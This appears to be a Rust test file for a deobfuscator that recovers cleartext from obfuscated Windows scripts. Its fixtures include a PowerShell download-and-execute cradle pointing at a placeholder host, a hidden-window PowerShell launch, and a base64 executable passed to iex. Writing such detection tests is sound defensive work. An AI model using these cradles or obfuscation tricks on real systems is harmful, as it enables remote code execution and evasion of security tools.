#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
use disrobe_pass_scriptlang::lang::winscript;
use disrobe_pass_scriptlang::lang::winscript::recover;
use disrobe_pass_scriptlang::{WinScriptLang, WinScriptRecovery, WinTechnique};

fn rec(text: &str) -> WinScriptRecovery {
    let lang: WinScriptLang =
        winscript::classify(text).expect("should classify as a windows script");
    recover(lang, text)
}

#[test]
fn real_replace_method_recovers_cleartext() {
    let obf: &str =
        "iex ('iQQx (NQQw-ObjQQct NQQt.WQQbCliQQnt).DownloadString(http://x/y)').Replace('QQ','e')";
    let r: WinScriptRecovery = rec(obf);
    assert!(r.techniques.contains(&WinTechnique::ReplaceTransform));
    assert!(
        r.recovered_text
            .contains("iex (New-Object Net.WebClient).DownloadString(http://x/y)"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_replace_operator_recovers_cleartext() {
    let obf: &str = "iex ('Write-H99st pwned' -replace '99','o')";
    let r: WinScriptRecovery = rec(obf);
    assert!(r.techniques.contains(&WinTechnique::ReplaceTransform));
    assert!(
        r.recovered_text.contains("Write-Host pwned"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_replace_chained_two_passes() {
    let obf: &str = "iex ('XiYex hostX'.Replace('X','').Replace('Y','i'))";
    let r: WinScriptRecovery = rec(obf);
    assert!(r.techniques.contains(&WinTechnique::ReplaceTransform));
    assert!(
        r.recovered_text.contains("iex host"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_string_reverse_join_recovers_cleartext() {
    let obf: &str = "iex (('denwp tsoH-etirW')[-1..-16] -join '')";
    let r: WinScriptRecovery = rec(obf);
    assert!(r.techniques.contains(&WinTechnique::StringReverse));
    assert!(
        r.recovered_text.contains("Write-Host pwned"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_jscript_fromcharcode_recovers_cleartext() {
    let obf: &str = "WScript.Echo(String.fromCharCode(77,115,103,66,111,120));";
    let lang: WinScriptLang = winscript::classify(obf).expect("classify wsh script");
    let r: WinScriptRecovery = recover(lang, obf);
    assert!(r.techniques.contains(&WinTechnique::CharCodeJoin));
    assert!(
        r.recovered_text.contains("'MsgBox'"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_vbscript_chr_concat_recovers_cleartext() {
    let obf: &str = "Execute(Chr(77) & Chr(115) & Chr(103) & Chr(66) & Chr(111) & Chr(120))\nWScript.CreateObject(\"x\")";
    let lang: WinScriptLang = winscript::classify(obf).expect("classify vbscript");
    assert_eq!(lang, WinScriptLang::VbScript);
    let r: WinScriptRecovery = recover(lang, obf);
    assert!(r.techniques.contains(&WinTechnique::CharBuilderConcat));
    assert!(
        r.recovered_text.contains("'MsgBox'"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_batch_var_substring_resolves() {
    let obf: &str =
        "@echo off\nset s=powershell.exe -nop -w hidden\n%s:~0,10% %s:~11%\nif exist x goto :eof";
    let lang: WinScriptLang = winscript::classify(obf).expect("classify batch");
    assert_eq!(lang, WinScriptLang::Batch);
    let r: WinScriptRecovery = recover(lang, obf);
    assert!(r.techniques.contains(&WinTechnique::BatchVarSubstring));
    assert!(
        r.recovered_text.contains("powershell exe -nop -w hidden"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_batch_var_substring_negative_length() {
    let obf: &str = "@echo off\nset v=powershell.exe\necho %v:~0,-4%\nsetlocal";
    let lang: WinScriptLang = winscript::classify(obf).expect("classify batch");
    let r: WinScriptRecovery = recover(lang, obf);
    assert!(r.techniques.contains(&WinTechnique::BatchVarSubstring));
    assert!(
        r.recovered_text.contains("echo powershell"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn real_embedded_pe_blob_flagged() {
    let pe_b64: &str = "$b=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); iex";
    let r: WinScriptRecovery = rec(pe_b64);
    assert!(
        r.techniques.contains(&WinTechnique::EmbeddedPeBlob),
        "embedded MZ/PE base64 must be flagged: {:?}",
        r.techniques
    );
    assert!(
        r.layers
            .iter()
            .any(|l| l.technique == WinTechnique::EmbeddedPeBlob && l.recovered.contains("MZ/PE")),
        "embedded-PE layer must describe the carved executable"
    );
}

#[test]
fn replace_layered_then_concat() {
    let obf: &str = "iex (('IQQx'+' hZZst').Replace('QQ','e').Replace('ZZ','o'))";
    let r: WinScriptRecovery = rec(obf);
    assert!(r.techniques.contains(&WinTechnique::StringConcat));
    assert!(r.techniques.contains(&WinTechnique::ReplaceTransform));
    assert!(
        r.recovered_text.contains("Iex host"),
        "recovered: {}",
        r.recovered_text
    );
}

#[test]
fn clean_replace_call_on_unrelated_string_does_not_explode() {
    let clean: &str = "Get-ChildItem | Where-Object { $_.Name -replace 'foo','bar' }";
    let r: WinScriptRecovery = rec(clean);
    assert!(
        r.recovered_text.contains("bar"),
        "literal replace still resolves but stays well-formed: {}",
        r.recovered_text
    );
}

#[test]
fn reverse_does_not_fire_on_plain_index() {
    let clean: &str = "$arr[-1]; Write-Host done";
    let r: WinScriptRecovery = rec(clean);
    assert!(
        !r.techniques.contains(&WinTechnique::StringReverse),
        "a bare negative index must not be treated as a reverse idiom: {:?}",
        r.techniques
    );
}
